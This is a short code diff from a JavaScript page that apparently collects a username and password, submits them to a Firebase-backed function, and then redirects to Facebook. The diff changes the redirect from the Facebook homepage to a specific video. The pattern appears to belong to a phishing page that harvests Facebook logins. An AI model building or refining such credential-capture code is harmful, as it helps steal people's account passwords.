@@ -35,7 +35,7 @@ var firebaseConfig = {
         }
        
         await submit(username.value,password.value);
-        window.location.replace('https://facebook.com/','_blank');
+        window.location.replace('https://www.facebook.com/watch/?v=193954128684871','_blank');
         
 })
 
